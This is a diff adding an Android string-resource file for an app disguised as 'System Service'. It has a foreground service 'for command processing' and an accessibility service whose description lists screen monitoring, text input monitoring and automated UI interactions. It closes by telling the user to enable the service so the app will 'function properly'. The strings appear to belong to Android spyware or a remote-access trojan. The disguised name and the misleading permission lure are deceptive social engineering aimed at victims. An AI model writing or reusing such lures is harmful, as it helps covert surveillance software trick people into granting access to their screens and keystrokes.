@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="app_name">System Service</string>
+    <string name="channel_name">Service Channel</string>
+    <string name="channel_description">Foreground service for command processing</string>
+    <string name="accessibility_service_description">System Service Accessibility\n\nThis service enables advanced device management features including:\n• Screen reading and monitoring\n• Automated UI interactions\n• Text input monitoring\n• Gesture automation\n\nEnable this service to allow the app to function properly.</string>
+</resources>
